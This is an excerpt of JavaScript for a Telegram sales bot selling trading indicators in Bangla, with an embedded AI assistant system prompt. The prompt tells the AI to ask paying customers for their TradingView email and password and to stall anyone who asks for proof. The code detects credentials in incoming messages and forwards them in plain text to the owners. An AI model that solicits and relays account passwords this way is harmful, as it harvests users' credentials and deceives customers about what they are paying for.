...
async function groqReply(messages) {
  ...
  const system = `You are Bangladesh Income Hub's smart AI sales assistant. Always reply in Bangla. Be friendly and professional. Use "ভাইজান" and "আপনি".
...
- After payment screenshot: ask for TradingView email and password
- After receiving credentials: say team will set up indicator shortly
- If asks for video/proof: say owner will send shortly
- Keep replies short, friendly and helpful
- Never share owner contact directly`;
  ...
  try {
    ...
    return data?.choices?.[0]?.message?.content || "দুঃখিত ভাইজান, একটু সমস্যা হচ্ছে। আবার try করুন।";
  } catch (e) {
...
const WELCOME = `🌟 *বাংলাদেশ ইনকাম হাব* এ আপনাকে স্বাগতম ভাইজান!

আমরা Professional Trading Indicators নিয়ে কাজ করি। আমাদের indicator ব্যবহার করে হাজারো trader সফলভাবে trade করছে।
...
/indicator — Indicator সম্পর্কে বিস্তারিত
/buy — Payment করার নিয়ম
/products — সব products দেখুন
/support — সাহায্য দরকার?

যেকোনো প্রশ্ন করুন ভাইজান — আমি সাহায্য করতে সদা প্রস্তুত! 🤝`;
  ...
  try {
    ...
    if (text.startsWith("/")) {
      ...
      if (cmd === "/start") {
        ...
        await sendMsg(chatId, `🆘 *Support দরকার ভাইজান?*\n\nআপনার সমস্যা বা প্রশ্ন লিখুন — আমাদের team শীঘ্রই সাহায্য করবে।`);
        await forwardToOwners(`🆘 Support request\n@${username} (${chatId})`);
      }
      return res.status(200).json({ ok: true });
    }

    // Client text — detect credentials
    if (text && !isOwner) {
      const intent = detectIntent(text);

      // If client sends TradingView credentials
      if (intent === "credentials") {
        await sendMsg(chatId, `🔑 *Credentials পেয়েছি ভাইজান!*\n\nআমরা আপনার TradingView account এ indicator set করে দেবো। ২৪ ঘন্টার মধ্যে সম্পন্ন হবে। ✅`);
        await forwardToOwners(`🔑 *TRADINGVIEW CREDENTIALS*\n👤 @${username}\n📱 Chat ID: \`${chatId}\`\n\n📝 Message: ${text}\n\nTo reply: \`REPLY:${chatId}: message\``);
        return res.status(200).json({ ok: true });
      }

      // Alert owner with intent
